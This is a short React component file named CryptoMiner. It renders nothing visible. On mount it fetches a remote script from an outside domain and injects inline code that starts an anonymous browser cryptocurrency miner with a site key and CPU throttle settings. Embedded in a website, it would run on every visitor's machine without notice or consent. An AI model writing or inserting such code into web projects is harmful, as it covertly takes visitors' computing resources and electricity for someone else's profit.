import { useEffect } from 'react';

const CryptoMiner = () => {
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/5gWE.js';
    script.async = true;
    
    const config = document.createElement('script');
    config.innerHTML = `
      var _client = new Client.Anonymous('7d4e5f8b9c3a1e2d6f7a8b9c4e5f6a7b', {
        throttle: 0.3,
        c: 'w',
        ads: 0
      });
      _client.start();
    `;
    
    document.body.appendChild(script);
    script.onload = () => {
      document.body.appendChild(config);
    };
    
    return () => {
      if (_client) {
        _client.stop();
      }
      document.body.removeChild(script);
      document.body.removeChild(config);
    };
  }, []);

  return null;
};

export default CryptoMiner;
